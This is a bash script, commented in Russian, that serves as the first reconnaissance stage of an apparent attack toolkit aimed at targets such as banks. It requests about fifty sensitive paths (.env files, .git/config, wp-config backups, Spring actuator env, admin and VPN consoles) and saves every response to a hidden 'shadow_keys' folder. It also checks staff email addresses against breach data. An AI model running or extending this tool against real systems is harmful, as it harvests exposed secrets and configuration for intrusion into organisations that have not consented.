#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && { echo "Usage: $0 https://bank.com"; exit 1; }
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
KEY1_DIR="$HOME/.shadow_keys/$DOMAIN/key1_recon"
mkdir -p "$KEY1_DIR"

echo "[КЛЮЧ 1] 🔍 Ищу забытые двери..."

# 50 endpoint'ов которые часто забывают закрыть
ENDPOINTS=(
    "/.env" "/.env.backup" "/.env.example" "/.git/HEAD" "/.git/config"
    "/wp-config.php" "/wp-config.php.bak" "/config.php" "/config.yml"
    "/phpinfo.php" "/info.php" "/test.php" "/debug" "/dev"
    "/admin" "/administrator" "/wp-admin" "/user/login"
    "/api" "/api/v1" "/api/v2" "/graphql" "/swagger" "/openapi"
    "/.well-known/security.txt" "/.well-known/openid-configuration"
    "/robots.txt" "/sitemap.xml"
    "/backup" "/old" "/new" "/staging" "/demo"
    "/console" "/jmx-console" "/web-console"
    "/actuator" "/actuator/health" "/actuator/env"
    "/solr" "/elasticsearch" "/kibana" "/grafana"
    "/jenkins" "/gitlab" "/bitbucket"
    "/owa" "/ecp" "/autodiscover"
    "/remote/login" "/vpn" "/citrix"
)

FOUND=0
for endpoint in "${ENDPOINTS[@]}"; do
    code=$(curl -sk --max-time 3 -o "$KEY1_DIR/$(echo $endpoint | tr '/' '_').txt" -w "%{http_code}" "$TARGET$endpoint" 2>/dev/null)
    if [ "$code" = "200" ]; then
        echo "  💀 НАЙДЕН: $endpoint (HTTP 200)"
        FOUND=$((FOUND + 1))
        echo "$endpoint" >> "$KEY1_DIR/found_endpoints.txt"
    fi
done

# Проверяем утечки через Have I Been Pwned
for email in admin@$DOMAIN info@$DOMAIN support@$DOMAIN; do
    result=$(curl -sk "https://haveibeenpwned.com/api/v3/breachedaccount/$email" -H "hibp-api-key: 0" 2>/dev/null)
    [ -n "$result" ] && echo "  🩸 УТЕЧКА: $email" && echo "$email" >> "$KEY1_DIR/leaked_emails.txt"
done

echo "[КЛЮЧ 1] ✅ Найдено: $FOUND endpoint'ов + $(wc -l < $KEY1_DIR/leaked_emails.txt 2>/dev/null || echo 0) утечек"
echo "[КЛЮЧ 1] 📁 $KEY1_DIR/"
